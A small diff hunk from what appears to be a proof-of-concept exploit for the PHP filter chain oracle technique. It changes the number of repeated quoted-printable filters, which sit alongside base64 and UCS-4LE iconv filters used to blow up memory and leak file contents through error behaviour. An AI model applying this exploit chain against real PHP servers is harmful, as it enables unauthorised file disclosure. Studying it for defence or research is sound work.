@@ -115,7 +115,7 @@ https://github.com/4xura/php_filter_chain_oracle_poc/blob/main/filters_playaroun
 HEADER = 'convert.base64-encode|convert.base64-encode'
 
 # Turn `==` become `=3D=3D` to blow up memeory:
-BLOW_UP_ENC = join(*['convert.quoted-printable-encode']*3000)  # The repeated amount does not matter, can be altered
+BLOW_UP_ENC = join(*['convert.quoted-printable-encode']*1000)  # The repeated amount does not matter, can be altered
 
 # Inflates string 4x per filter use
 BLOW_UP_UTF32 = 'convert.iconv.L1.UCS-4LE'
